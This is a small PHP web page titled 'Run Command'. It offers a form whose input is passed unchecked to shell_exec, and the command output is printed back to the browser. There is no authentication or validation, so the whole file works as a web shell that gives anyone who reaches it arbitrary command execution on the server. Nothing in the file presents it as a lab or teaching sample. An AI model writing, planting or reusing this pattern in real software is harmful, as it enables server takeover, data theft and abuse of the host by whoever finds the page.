<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Run Command</title>
</head>

<body>
	<h1>Run a Command</h1>
	<form method="POST">
		<label for="command">Enter Command:</label>
		<input type="text" id="command" name="command" placeholder="e.g., whoami" required>
		<button type="submit">Run</button>
	</form>

	<?php
	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
		$command = $_POST['command'];
		$output = shell_exec($command); // Execute command
		echo "<pre>Output:\n$output</pre>";
	}
	?>
</body>

</html>